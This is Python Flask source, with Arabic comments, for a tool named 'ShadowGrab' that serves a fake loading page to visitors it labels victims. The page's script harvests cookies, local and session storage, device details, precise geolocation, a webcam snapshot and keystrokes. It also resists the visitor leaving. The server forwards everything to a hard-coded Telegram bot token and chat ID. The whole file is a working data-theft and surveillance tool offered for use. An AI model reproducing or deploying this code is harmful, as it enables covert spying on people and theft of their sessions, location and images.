from flask import Flask, render_template_string, request, jsonify
import os
import json
import requests
import threading
import datetime
import base64

app = Flask(__name__)

# ===== إعدادات بوت تيليجرام =====
TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
TELEGRAM_CHAT_ID = "1170411845"

def send_telegram_notification(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=5)
        return response.json()
    except Exception as e:
        print(f"خطأ في الإرسال: {e}")
        return None

# ===== صفحة الهجوم =====
@app.route('/')
def index():
    visitor_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'غير معروف')
    
    # إشعار فوري عند الدخول
    message = f"""🎯 <b>دخول ضحية جديدة!</b>

🌐 <b>IP:</b> {visitor_ip}
💻 <b>المتصفح:</b> {user_agent[:150]}
⏰ <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>جاري سحب البيانات...</b>"""
    threading.Thread(target=send_telegram_notification, args=(message,)).start()
    
    # صفحة مصيدة تحتوي على جميع أكواد السحب
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            body { background: black; color: #00ff41; font-family: Arial; text-align: center; padding: 50px; }
            .loader { border: 4px solid #333; border-top: 4px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 50px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <h1 style="color:#00ff41;">جار التحميل...</h1>
        <p style="color:#666;">الرجاء الانتظار</p>
        
        <script>
            // ===== 1. جمع معلومات الجهاز =====
            const data = {
                ip: "{{ request.remote_addr }}",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || "مباشر",
                cookies: document.cookie || "لا توجد كوكيز",
                localStorage: JSON.stringify(localStorage) || "{}",
                sessionStorage: JSON.stringify(sessionStorage) || "{}",
                timestamp: new Date().toISOString()
            };
            
            // ===== 2. محاولة الحصول على الموقع الجغرافي =====
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.latitude = pos.coords.latitude;
                        data.longitude = pos.coords.longitude;
                        data.accuracy = pos.coords.accuracy;
                        sendData();
                    },
                    err => {
                        data.geoError = err.message;
                        sendData();
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                data.geoError = "Geolocation غير مدعوم";
                sendData();
            }
            
            // ===== 3. محاولة التقاط صورة من الكاميرا =====
            function captureCamera() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                        .then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.onloadedmetadata = () => {
                                video.play();
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const imgData = canvas.toDataURL('image/jpeg', 0.7);
                                data.cameraImage = imgData;
                                stream.getTracks().forEach(t => t.stop());
                                sendData();
                            };
                        })
                        .catch(err => {
                            data.cameraError = err.message;
                            sendData();
                        });
                } else {
                    data.cameraError = "الكاميرا غير مدعومة";
                    sendData();
                }
            }
            
            // ===== 4. Keylogger =====
            let keys = [];
            document.addEventListener('keydown', e => {
                keys.push(e.key);
                if (keys.length > 200) keys.shift();
                data.keys = keys.join(' ');
            });
            
            // ===== 5. إرسال البيانات =====
            let sent = false;
            function sendData() {
                if (sent) return;
                // ننتظر الكاميرا إذا لم ترسل بعد
                if (data.cameraImage === undefined && !data.cameraError) {
                    // ننتظر ثانية ثم نرسل
                    setTimeout(() => {
                        if (!sent) {
                            sent = true;
                            finalSend();
                        }
                    }, 3000);
                    return;
                }
                sent = true;
                finalSend();
            }
            
            function finalSend() {
                // إضافة المفاتيح المسجلة
                data.keys = keys.join(' ');
                
                // تشفير Base64 للإرسال
                const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
                
                // إرسال إلى الخادم
                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ payload: payload })
                }).then(() => {
                    console.log('✅ تم إرسال البيانات');
                }).catch(err => {
                    console.log('❌ خطأ في الإرسال:', err);
                });
                
                // إرسال مباشر إلى التيليجرام عبر الخادم
                fetch('/telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: data })
                }).catch(() => {});
            }
            
            // بدء التقاط الكاميرا بعد 2 ثانية
            setTimeout(captureCamera, 2000);
            
            // إرسال تلقائي بعد 10 ثواني احتياطياً
            setTimeout(() => {
                if (!sent) {
                    sent = true;
                    finalSend();
                }
            }, 10000);
            
            // منع الخروج
            window.onbeforeunload = function() {
                return "جار التحميل...";
            };
            
            // إخفاء المؤشر
            document.body.style.cursor = 'wait';
        </script>
    </body>
    </html>
    '''

# ===== نقطة استقبال البيانات =====
@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        if data and 'payload' in data:
            # فك التشفير
            decoded = json.loads(base64.b64decode(data['payload']).decode('utf-8'))
            
            # بناء رسالة مفصلة
            msg = f"""🎯 <b>بيانات الضحية</b>

🌐 <b>IP:</b> {decoded.get('ip', 'غير معروف')}
💻 <b>المتصفح:</b> {decoded.get('userAgent', 'غير معروف')[:100]}
📱 <b>المنصة:</b> {decoded.get('platform', 'غير معروف')}
🌍 <b>اللغة:</b> {decoded.get('language', 'غير معروف')}
🖥️ <b>الشاشة:</b> {decoded.get('screenWidth', '?')}x{decoded.get('screenHeight', '?')}
🕒 <b>المنطقة:</b> {decoded.get('timezone', 'غير معروف')}
📌 <b>المرجع:</b> {decoded.get('referrer', 'مباشر')[:80]}
🍪 <b>الكوكيز:</b> {decoded.get('cookies', 'لا توجد')[:150]}
"""

            # الموقع
            if 'latitude' in decoded:
                msg += f"""📍 <b>الموقع:</b> {decoded.get('latitude')}, {decoded.get('longitude')} (دقة: {decoded.get('accuracy', '?')}م)\n"""
            if 'geoError' in decoded:
                msg += f"⚠️ <b>خطأ الموقع:</b> {decoded.get('geoError')}\n"
            
            # الكاميرا
            if 'cameraImage' in decoded:
                msg += f"📸 <b>صورة الكاميرا:</b> تم التقاطها (مشفرة)\n"
                # إرسال الصورة كملف
                img_data = decoded['cameraImage'].split(',')[1]
                send_photo(img_data)
            if 'cameraError' in decoded:
                msg += f"⚠️ <b>خطأ الكاميرا:</b> {decoded.get('cameraError')}\n"
            
            # المفاتيح
            if 'keys' in decoded and decoded['keys']:
                msg += f"⌨️ <b>المفاتيح:</b> {decoded['keys'][:200]}\n"
            
            # التخزين المحلي
            if decoded.get('localStorage') and decoded['localStorage'] != '{}':
                msg += f"💾 <b>LocalStorage:</b> {decoded['localStorage'][:150]}\n"
            
            msg += f"\n⏰ <b>الوقت:</b> {decoded.get('timestamp', datetime.datetime.now().isoformat())}"
            
            send_telegram_notification(msg)
            return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ في جمع البيانات: {e}")
    return jsonify({"status": "error"}), 400

# ===== إرسال الصورة للتيليجرام =====
def send_photo(base64_image):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('image.jpg', base64.b64decode(base64_image), 'image/jpeg')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 صورة من كاميرا الضحية'}
        requests.post(url, files=files, data=data, timeout=10)
    except Exception as e:
        print(f"خطأ في إرسال الصورة: {e}")

# ===== نقطة إرسال مباشر للتيليجرام =====
@app.route('/telegram', methods=['POST'])
def telegram_direct():
    try:
        data = request.json.get('data', {})
        msg = f"""🎯 <b>بيانات فورية</b>

🌐 IP: {data.get('ip', 'غير معروف')}
💻 UA: {data.get('userAgent', 'غير معروف')[:80]}
📍 الموقع: {data.get('latitude', '?')}, {data.get('longitude', '?')}
📸 كاميرا: {'✅' if 'cameraImage' in data else '❌'}
⌨️ مفاتيح: {data.get('keys', '')[:100]}"""
        send_telegram_notification(msg)
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ: {e}")
        return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    # إشعار تشغيل
    try:
        send_telegram_notification(f"""🔥 <b>تم تشغيل ShadowGrab!</b>

🎯 الموقع جاهز لاستقبال الضحايا
📨 سيتم إرسال كل البيانات إلى البوت
🛡️ البوت: @SSSTlF
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
    except:
        pass
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
